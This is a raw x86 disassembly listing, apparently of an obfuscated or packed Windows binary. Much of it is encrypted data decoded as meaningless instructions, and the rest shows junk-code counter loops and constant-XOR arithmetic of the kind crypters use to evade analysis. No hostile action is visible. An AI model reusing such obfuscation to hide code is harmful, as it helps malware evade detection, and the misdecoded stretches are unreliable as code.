  404817:	sub    edi,DWORD PTR [esi+eiz*1-0x7f5c3799]
  40481e:	jl     0x4047d9
  404820:	cmp    ch,BYTE PTR [eax]
  404822:	cmp    al,0x8f
  404824:	dec    eax
  404825:	push   ds
  404826:	push   0x7f
  404828:	aam    0xa7
  40482a:	dec    esp
  40482b:	std    
  40482c:	imul   edx,DWORD PTR [edi-0x634fd037],0x8761c3dc
  404836:	repz inc edi
  404838:	jge    0x404851
  40483a:	adc    al,0x40
  40483c:	bound  esi,QWORD PTR ds:0x9321e5ee
  404842:	adc    dl,BYTE PTR [esi-0x62]
  404845:	add    dh,al
  404847:	jnp    0x4047d0
  404849:	ins    BYTE PTR es:[edi],dx
  40484a:	push   ss
  40484b:	std    
  40484c:	mov    ds:0x15181138,eax
  404851:	add    al,0xe4
  404853:	jnp    0x404848
  404855:	mov    eax,ds:0xa4e0d0a0
  40485a:	lods   al,BYTE PTR ds:[esi]
  40485b:	sar    DWORD PTR [ecx+0x69],cl
  40485e:	mov    DWORD PTR [edx],eax
  404860:	test   eax,0xe6134a9d
  404866:	sub    ecx,DWORD PTR [ebx+0x49]
  404869:	and    DWORD PTR [edx+0x54f08ad7],edx
  40486f:	mov    ebx,edx
  404871:	add    al,0xf
  404873:	mov    ds:0xa305dc5f,al
  404878:	or     al,BYTE PTR [edi+0x55016a76]
  40487e:	adc    BYTE PTR [ebx-0x75d94d80],0x6c
  404885:	repnz nop
  404887:	adc    al,0x3e
  404889:	pop    edx
  40488a:	jno    0x404848
  40488c:	das    
  40488d:	xor    DWORD PTR [ebp-0x4d],ebp
  404890:	pushf  
  404891:	xchg   DWORD PTR [eax],esp
  404893:	es int3 
  404895:	add    dl,ch
  404897:	adc    dh,BYTE PTR ds:0x2a329109
  40489d:	jp     0x4048a9
  40489f:	pop    edx
  4048a0:	fbld   TBYTE PTR [edx]
  4048a2:	neg    dh
  4048a4:	das    
  4048a5:	mov    dl,0x1b
  4048a7:	fmul   DWORD PTR [ebp+0x4]
  4048aa:	mul    DWORD PTR [eax+0x22482ced]
  4048b0:	mov    al,0xc5
  4048b2:	lea    edx,[ebp-0x11]
  4048b5:	daa    
  4048b6:	sbb    DWORD PTR [ebx-0x552d408a],edi
  4048bc:	dec    ebp
  4048bd:	mov    al,0x79
  4048bf:	or     eax,0xb50c84a8
  4048c4:	call   0xc51fb6dd
  4048c9:	inc    ebp
  4048ca:	sar    BYTE PTR [esi+0x4c],1
  4048cd:	or     esp,DWORD PTR ds:0x7b8e723f
  4048d3:	adc    ebx,edx
  4048d5:	gs aad 0x95
  4048d8:	jae    0x4048c2
  4048da:	fsub   st(6),st
  4048dc:	inc    ebp
  4048dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048de:	aam    0x14
  4048e0:	or     DWORD PTR [ebp+0x52],ecx
  4048e3:	pop    es
  4048e4:	clc    
  4048e5:	mov    esi,0xddc00e36
  4048ea:	mov    bl,0xaa
  4048ec:	fimul  DWORD PTR [ecx-0x33d8f213]
  4048f2:	cmp    eax,0x5dcce86f
  4048f7:	cmp    bh,0xd7
  4048fa:	mov    ah,0x7b
  4048fc:	ja     0x4048a6
  4048fe:	jae    0x404928
  404900:	dec    ebp
  404901:	push   esi
  404902:	out    dx,al
  404903:	imul   ebp,DWORD PTR [ecx-0x1c0213e8],0x1c
  40490a:	or     al,0x9f
  40490c:	mov    esi,0xa7977ed
  404911:	sub    ebp,esp
  404913:	inc    edx
  404914:	jmp    0xc8cd:0x4f726934
  40491b:	adc    cl,BYTE PTR [edx-0x25d90669]
  404921:	jp     0x404975
  404923:	dec    ebx
  404924:	dec    ebx
  404925:	and    BYTE PTR [ecx],0xe0
  404928:	mov    ah,0x88
  40492a:	pop    ebx
  40492b:	add    eax,0x9c7dd056
  404930:	mov    esi,DWORD PTR [ecx]
  404932:	test   BYTE PTR [eax+0x4bd47663],0xdf
  404939:	xor    ecx,ebx
  40493b:	fcmovbe st,st(6)
  40493d:	imul   DWORD PTR [edx+0x7736c6e1]
  404943:	push   edx
  404944:	xor    eax,0xe33cb1bb
  404949:	xchg   ebp,eax
  40494a:	arpl   WORD PTR [ebx],dx
  40494c:	mov    dl,0xbd
  40494e:	outs   dx,DWORD PTR ds:[esi]
  40494f:	daa    
  404950:	arpl   si,bp
  404952:	popf   
  404953:	(bad)  
  404954:	dec    esp
  404955:	jnp    0x4049ae
  404957:	mov    gs,edx
  404959:	jl     0x40496c
  40495b:	push   es
  40495c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40495d:	xchg   BYTE PTR [esi+0x4fca1cd2],ah
  404963:	shl    WORD PTR [edi+0x7f],1
  404967:	shl    DWORD PTR [edi-0x38],cl
  40496a:	xchg   edx,eax
  40496b:	rcr    BYTE PTR [esi+0x46],1
  40496e:	das    
  40496f:	add    DWORD PTR [ecx-0x3b7dd83d],esp
  404975:	inc    BYTE PTR [ebp-0x22693b6b]
  40497b:	inc    edx
  40497c:	inc    edx
  40497d:	(bad)  
  40497e:	hlt    
  40497f:	loop   0x404967
  404981:	jge    0x404905
  404983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404984:	mov    cl,0xe1
  404986:	dec    ebx
  404987:	inc    eax
  404988:	and    DWORD PTR [esi],ebx
  40498a:	mov    esi,0xec72ad0c
  40498f:	add    ah,BYTE PTR [esi-0x1d]
  404992:	add    eax,0xa10ffe5d
  404997:	pop    esi
  404998:	mov    bh,0x2
  40499a:	mov    bl,BYTE PTR [edx-0x10b43182]
  4049a0:	in     eax,dx
  4049a1:	ja     0x4049a3
  4049a3:	(bad)  
  4049a4:	sub    eax,0xff9055b2
  4049a9:	idiv   ah
  4049ab:	mov    ecx,0x9dc0860c
  4049b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049b1:	(bad)  
  4049b2:	add    ebx,DWORD PTR [eax]
  4049b4:	sahf   
  4049b5:	add    BYTE PTR [edx-0xe13a845],cl
  4049bb:	mov    WORD PTR [esi],gs
  4049bd:	push   ss
  4049be:	jmp    0x404999
  4049c0:	fsubr  DWORD PTR [ecx+ebx*8-0x63]
  4049c4:	into   
  4049c5:	(bad)  
  4049c6:	call   0x80da:0x4e083b65
  4049cd:	icebp  
  4049ce:	jg     0x4049a3
  4049d0:	lds    ebp,FWORD PTR [eax]
  4049d2:	cmp    dh,BYTE PTR [esi+0x680e8173]
  4049d8:	add    esi,edi
  4049da:	xor    esi,DWORD PTR [eax+0x71c95ee]
  4049e0:	ret    0x4227
  4049e3:	pop    es
  4049e4:	pop    ss
  4049e5:	add    ch,BYTE PTR [edx+0x7705a3ae]
  4049eb:	xchg   ecx,eax
  4049ec:	cmp    BYTE PTR [esi-0x1],0x5c
  4049f0:	in     al,dx
  4049f1:	hlt    
  4049f2:	mov    cl,0x63
  4049f4:	cmp    bl,BYTE PTR [edi+0x4b]
  4049f7:	fdiv   QWORD PTR [ecx-0x148f5dcf]
  4049fd:	jp     0x404a10
  4049ff:	push   ebx
  404a00:	icebp  
  404a01:	adc    ecx,DWORD PTR [edi+0x29]
  404a04:	mov    esi,0x6461e3b
  404a09:	mov    bl,0x71
  404a0b:	lahf   
  404a0c:	cmp    BYTE PTR [edi+ebx*2],cl
  404a0f:	in     al,dx
  404a10:	jne    0x404a8e
  404a12:	mov    bh,0x28
  404a14:	jbe    0x404a3c
  404a16:	cmp    BYTE PTR gs:[ebx-0x679d4af4],al
  404a1d:	test   DWORD PTR [ecx-0x80],0x7eb04c8
  404a24:	or     eax,0x3a37840f
  404a29:	add    cl,BYTE PTR [edi]
  404a2b:	cwde   
  404a2c:	and    DWORD PTR [ebx-0x26],edi
  404a2f:	pop    ecx
  404a30:	pop    es
  404a31:	leave  
  404a32:	cli    
  404a33:	mov    ?,ebp
  404a35:	xchg   BYTE PTR [eax-0x7c3b73d8],ah
  404a3b:	pop    DWORD PTR ds:0xfe04ba9a
  404a41:	das    
  404a42:	es dec ecx
  404a44:	jno    0x4049cb
  404a46:	repz out dx,al
  404a48:	dec    ebp
  404a49:	arpl   WORD PTR [eax-0x3e93a7e0],bp
  404a4f:	out    0x9,al
  404a51:	mov    al,ds:0x429f39ab
  404a56:	xor    bl,dl
  404a58:	sbb    DWORD PTR [edx],ebx
  404a5a:	jnp    0x404aa9
  404a5c:	lods   eax,DWORD PTR ds:[esi]
  404a5d:	cwde   
  404a5e:	arpl   WORD PTR [ebx-0x7e],cx
  404a61:	pop    eax
  404a63:	clc    
  404a64:	xchg   ebp,eax
  404a65:	dec    edx
  404a66:	jo     0x404a36
  404a68:	pop    ss
  404a69:	dec    ebx
  404a6a:	into   
  404a6b:	ret    
  404a6c:	scas   eax,DWORD PTR es:[edi]
  404a6d:	clc    
  404a6e:	pop    edi
  404a6f:	pop    edi
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x11dffae5]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	add    DWORD PTR ds:0x354e8d2,edx
  404b3f:	(bad)  
  404b40:	lods   al,BYTE PTR ds:[esi]
  404b41:	addr16 icebp 
  404b43:	push   ebp
  404b44:	cmc    
  404b45:	test   al,0x1f
  404b47:	rcr    BYTE PTR [ecx+0x7],0x4
  404b4b:	inc    ebx
  404b4c:	ins    BYTE PTR es:[edi],dx
  404b4d:	dec    esp
  404b4e:	adc    cl,dl
  404b50:	push   esp
  404b51:	aad    0xed
  404b53:	pop    edx
  404b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b55:	mov    ah,0x32
  404b57:	xor    ah,BYTE PTR [esi+0x2c]
  404b5a:	jmp    0x404b33
  404b5c:	cwde   
  404b5d:	in     al,dx
  404b5e:	test   eax,0x6fdb8013
  404b63:	push   eax
  404b64:	add    al,0x13
  404b66:	or     eax,0xb3590e26
  404b6b:	jg     0x404bc6
  404b6d:	popa   
  404b6e:	dec    ebx
  404b6f:	lods   eax,DWORD PTR ds:[esi]
  404b70:	cld    
  404b71:	daa    
  404b72:	ret    
  404b73:	pop    ebp
  404b74:	test   BYTE PTR [esi],0xb8
  404b77:	sub    dl,ch
  404b79:	jmp    FWORD PTR [edx-0x25]
  404b7c:	popf   
  404b7d:	mov    BYTE PTR [eax+0x5],ah
  404b80:	shl    dh,0xff
  404b83:	fimul  WORD PTR [edx]
  404b85:	add    dl,dl
  404b87:	pop    ebx
  404b88:	push   0x7d9fe044
  404b8d:	call   0x5cb8a1d4
  404b92:	lods   al,BYTE PTR ds:[esi]
  404b93:	dec    ebx
  404b94:	shr    BYTE PTR ds:0x4bc8fbd4,1
  404b9a:	mov    cl,0xdc
  404b9c:	cmp    al,0xfa
  404b9e:	inc    edi
  404b9f:	lods   al,BYTE PTR ds:[esi]
  404ba0:	in     eax,0x35
  404ba2:	setns  BYTE PTR [eax]
  404ba5:	xchg   ebx,eax
  404ba6:	pop    esi
  404ba7:	pushf  
  404ba8:	pop    edi
  404ba9:	or     ecx,DWORD PTR [edx]
  404bab:	int    0xb2
  404bad:	loope  0x404c00
  404baf:	imul   eax,esp,0xdce2e0ff
  404bb5:	enter  0x6232,0xbf
  404bb9:	xchg   esp,eax
  404bba:	pop    esp
  404bbb:	sbb    DWORD PTR ds:0xec6e98f5,ebx
  404bc1:	mov    edx,0x7dbd246a
  404bc6:	pop    edx
  404bc7:	loopne 0x404bc3
  404bc9:	arpl   WORD PTR [edi],bp
  404bcb:	punpcklwd mm7,mm2
  404bce:	push   ss
  404bcf:	push   ebx
  404bd0:	dec    ecx
  404bd1:	ja     0x404bd5
  404bd3:	ficomp WORD PTR ds:0x4cffe092
  404bd9:	xchg   ebx,eax
  404bda:	inc    ebp
  404bdb:	das    
  404bdc:	fdivr  QWORD PTR [eax+edi*2]
  404bdf:	(bad)  
  404be0:	cmp    bh,BYTE PTR [edi-0xf467356]
  404be6:	mov    al,0x52
  404be8:	fld    TBYTE PTR [esi-0x30de1c7c]
  404bee:	inc    ecx
  404bef:	xor    BYTE PTR [ebx+0x1a6de4f7],cl
  404bf5:	repz rcr DWORD PTR ds:0xa379e9e5,1
  404bfc:	mov    DWORD PTR [eax+0x3b9df43f],esp
  404c02:	jb     0x404c48
  404c04:	pop    ds
  404c05:	imul   esi,DWORD PTR [eax-0x3cb06751],0x18
  404c0c:	mov    WORD PTR [ebx+0x16],cs
  404c0f:	(bad)  
  404c10:	out    dx,al
  404c11:	inc    ebx
  404c12:	xor    al,0x44
  404c14:	enter  0x284f,0x3b
  404c18:	js     0x404baa
  404c1a:	mov    ebp,0x15116042
  404c1f:	sub    al,0xfc
  404c21:	call   FWORD PTR [edi-0x14]
  404c24:	sub    eax,0x4458202e
  404c29:	les    edx,FWORD PTR [edi]
  404c2b:	mov    dh,0x7e
  404c2d:	stc    
  404c2e:	(bad)  
  404c2f:	dec    eax
  404c30:	mov    esp,0xae991834
  404c35:	jmp    0xc18c:0x432b75a6
  404c3c:	loopne 0x404c62
  404c3e:	mov    ebx,0xcf6ee362
  404c43:	sub    al,0x66
  404c45:	pusha  
  404c46:	pop    es
  404c47:	cmp    edi,DWORD PTR [eax+0x66]
  404c4a:	hlt    
  404c4b:	stc    
  404c4c:	enter  0x152b,0xfa
  404c50:	add    ecx,DWORD PTR [edx-0x4d505e22]
  404c56:	(bad)  
  404c58:	or     DWORD PTR [ecx-0x33a34299],edi
  404c5e:	ins    DWORD PTR es:[edi],dx
  404c5f:	xor    BYTE PTR [edi-0x38c31e61],0xa7
  404c66:	add    DWORD PTR [esi],eax
  404c68:	ss sbb al,0xe9
  404c6b:	add    bh,dh
  404c6d:	cdq    
  404c6e:	xor    bh,BYTE PTR [ebx-0x35]
  404c71:	pop    eax
  404c72:	ins    BYTE PTR es:[edi],dx
  404c73:	pushf  
  404c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c75:	int    0xc1
  404c77:	jbe    0x404cd9
  404c79:	lods   al,BYTE PTR ds:[esi]
  404c7a:	test   DWORD PTR [esi],esi
  404c7c:	test   al,0x16
  404c7e:	call   ebx
  404c80:	sbb    DWORD PTR [esi-0x596452b6],0x50
  404c87:	mov    bh,0x9a
  404c89:	push   gs
  404c8b:	(bad)  
  404c8c:	iret   
  404c8d:	js     0x404c75
  404c8f:	test   DWORD PTR [esi-0x59da0cfe],0xd69adfe1
  404c99:	sbb    ecx,DWORD PTR [eax+ebx*1+0x3ab44b83]
  404ca0:	mov    cl,0xdf
  404ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ca3:	jo     0x404c41
  404ca5:	cmp    DWORD PTR [ecx],edi
  404ca7:	jmp    0x95ab:0x17425004
  404cae:	ja     0x404d20
  404cb0:	jmp    0x404cf7
  404cb2:	in     eax,dx
  404cb3:	sub    bh,ah
  404cb5:	fwait
  404cb6:	or     al,0xb8
  404cb8:	in     eax,0xa8
  404cba:	outs   dx,BYTE PTR ds:[esi]
  404cbb:	fs aad 0x2b
  404cbe:	in     eax,0x49
  404cc0:	cmc    
  404cc1:	lock add dl,BYTE PTR [edi+0x1a71258e]
  404cc8:	fs push edi
  404cca:	mov    eax,ds:0x162b67d2
  404ccf:	sahf   
  404cd0:	xor    dl,BYTE PTR ds:0x1365bfe3
  404cd6:	add    al,0x73
  404cd8:	outs   dx,DWORD PTR ds:[esi]
  404cd9:	mov    edx,0x3fbcf981
  404cde:	in     eax,0x26
  404ce0:	shr    DWORD PTR [ebx+0x6f],0x31
  404ce4:	inc    esp
  404ce5:	adc    BYTE PTR [ebx+0x109e6386],0xd5
  404cec:	fwait
  404ced:	jge    0x404d0e
  404cef:	stc    
  404cf0:	cdq    
  404cf1:	push   esi
  404cf2:	fld    TBYTE PTR fs:[eax+ebp*4]
  404cf6:	xchg   ebx,eax
  404cf7:	pop    eax
  404cf8:	and    ch,BYTE PTR [esi]
  404cfa:	ror    DWORD PTR [eax+edi*4-0x11ff6836],cl
  404d01:	push   ebp
  404d02:	sahf   
  404d03:	inc    ecx
  404d04:	or     DWORD PTR [esi+0x1b],ebx
  404d07:	mov    ds:0x2a55a458,al
  404d0c:	ins    DWORD PTR es:[edi],dx
  404d0d:	addr16 sub al,0x7a
  404d10:	int3   
  404d11:	xchg   DWORD PTR [ebp-0x22],ebx
  404d14:	sub    edi,edx
  404d16:	or     DWORD PTR [edx-0x2b],esp
  404d19:	shr    BYTE PTR [ebp-0x5ae3cdd2],0x9d
  404d20:	rcl    ah,1
  404d22:	xchg   ebx,eax
  404d23:	shr    DWORD PTR [eax+0xc45623d],1
  404d29:	mov    eax,ds:0xc0661395
  404d2e:	stos   DWORD PTR es:[edi],eax
  404d2f:	out    0x29,eax
  404d31:	daa    
  404d32:	ds cli 
  404d34:	mov    ecx,DWORD PTR [eax-0x6b5a9a93]
  404d3a:	mov    edi,0x1efa6054
  404d3f:	jb     0x404d60
  404d41:	pop    edx
  404d42:	popf   
  404d43:	xlat   BYTE PTR ds:[ebx]
  404d44:	cdq    
  404d45:	xor    al,0xde
  404d47:	js     0x404d0b
  404d49:	scas   al,BYTE PTR es:[edi]
  404d4a:	(bad)
  404d4d:	push   ds
  404d4e:	inc    ebx
  404d4f:	pop    esi
  404d50:	mov    ds:0x90be9873,al
  404d55:	mov    esp,0x9211f90b
  404d5a:	hlt    
  404d5b:	fld    DWORD PTR [edx+0x3]
  404d5e:	jge    0x404d6b
  404d60:	loope  0x404d30
  404d62:	mov    bl,0x2e
  404d64:	add    eax,0x81c210ef
  404d69:	pop    es
  404d6a:	jl     0x404dbe
  404d6c:	add    ah,BYTE PTR [edx-0xe]
  404d6f:	loope  0x404db4
  404d71:	xor    eax,0x8dbc7b14
  404d76:	aam    0x3b
  404d78:	addr16 jmp 0x404d94
  404d7b:	mov    al,ds:0xead32718
  404d80:	mov    ah,bl
  404d82:	mov    ss,WORD PTR [esi-0x5cc08082]
  404d88:	cwde   
  404d89:	mov    ch,0xc4
  404d8b:	dec    esp
  404d8c:	scas   al,BYTE PTR es:[edi]
  404d8d:	cmp    edi,DWORD PTR [edx+ebx*1-0x25d261b1]
  404d94:	lods   eax,DWORD PTR ds:[esi]
  404d95:	das    
  404d96:	sub    BYTE PTR [edi+0x42283592],0xed
  404d9d:	fidiv  DWORD PTR [edi-0xe]
  404da0:	xlat   BYTE PTR ds:[ebx]
  404da1:	int    0xc3
  404da3:	in     al,dx
  404da4:	test   BYTE PTR [edi-0x2f],0x66
  404da8:	sub    ch,BYTE PTR [edi-0x22a8b03d]
  404dae:	mov    bl,0xbf
  404db0:	scas   al,BYTE PTR es:[edi]
  404db1:	pop    eax
  404db2:	arpl   si,bx
  404db4:	stos   DWORD PTR es:[edi],eax
  404db5:	or     eax,0xc5f788bd
  404dba:	shr    BYTE PTR [ebx+eiz*2-0x4c],0x8f
  404dbf:	jle    0x404e04
  404dc1:	(bad)  
  404dc2:	jmp    0x1fb0:0x929c77da
  404dc9:	lock mov bl,0x65
  404dcc:	adc    al,0x45
  404dce:	or     ebx,DWORD PTR [eax+ebp*2-0x37]
  404dd2:	bound  ebp,QWORD PTR [esi-0x1b]
  404dd5:	pop    ecx
  404dd6:	aas    
  404dd7:	mov    ah,0x5
  404dd9:	mov    ah,0x7b
  404ddb:	dec    eax
  404ddc:	xchg   ecx,eax
  404ddd:	push   cs
  404dde:	(bad)  
  404ddf:	push   0xffffffb0
  404de1:	ss mov bl,bl
  404de4:	mov    dh,0x12
  404de6:	fcom   st(3)
  404de8:	sbb    BYTE PTR [eax],dl
  404dea:	and    DWORD PTR [ebx-0x7d327f5f],ebp
  404df0:	and    BYTE PTR [ecx],0x9f
  404df3:	pusha  
  404df4:	call   0x5b12:0xe53c8bd
  404dfb:	mov    ds:0xb09c7de8,eax
  404e00:	sti    
  404e01:	rcl    DWORD PTR [edx],1
  404e03:	daa    
  404e04:	gs jle 0x404dcf
  404e07:	mov    BYTE PTR [edi-0x678eb0a4],0xfc
  404e0e:	das    
  404e0f:	nop
  404e10:	or     eax,0x9757302d
  404e15:	push   esp
  404e16:	out    0xc4,al
  404e18:	pop    ecx
  404e19:	xchg   ebx,eax
  404e1a:	and    DWORD PTR [edi-0x72],edx
  404e1d:	dec    esi
  404e1e:	jle    0x404e9d
  404e20:	pushf  
  404e21:	lds    eax,FWORD PTR [esi]
  404e23:	xchg   ecx,eax
  404e24:	sbb    ah,BYTE PTR [edx-0x36]
  404e27:	jl     0x404e9b
  404e29:	(bad)  
  404e2a:	daa    
  404e2b:	push   0xa0a3b6dc
  404e30:	call   0x1632:0x70c0cd1d
  404e37:	pop    edx
  404e38:	xor    DWORD PTR [esi],edx
  404e3a:	xor    dl,BYTE PTR [ebx-0x6f]
  404e3d:	jmp    0x8f8d6831
  404e42:	pop    es
  404e43:	and    ah,ah
  404e45:	in     al,0x8a
  404e47:	mov    ch,0x54
  404e49:	or     ah,BYTE PTR [ecx+0x1f]
  404e4c:	int3   
  404e4d:	sbb    eax,0x6f5cddb7
  404e52:	pusha  
  404e53:	loop   0x404e31
  404e55:	repnz push ss
  404e57:	xlat   BYTE PTR ds:[ebx]
  404e58:	loope  0x404e6d
  404e5a:	mov    eax,ds:0x64d1e13f
  404e5f:	add    BYTE PTR [eax-0x3d],dh
  404e62:	xor    eax,DWORD PTR [ebp+0x7d5197bb]
  404e68:	enter  0xcc0e,0xb2
  404e6c:	stc    
  404e6d:	gs scas eax,DWORD PTR es:[edi]
  404e6f:	inc    eax
  404e70:	out    0x5b,eax
  404e72:	ins    DWORD PTR es:[edi],dx
  404e73:	jecxz  0x404e61
  404e75:	pop    ss
  404e76:	mov    edx,DWORD PTR [ebp+0x8]
  404e79:	adc    ecx,0x7359
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
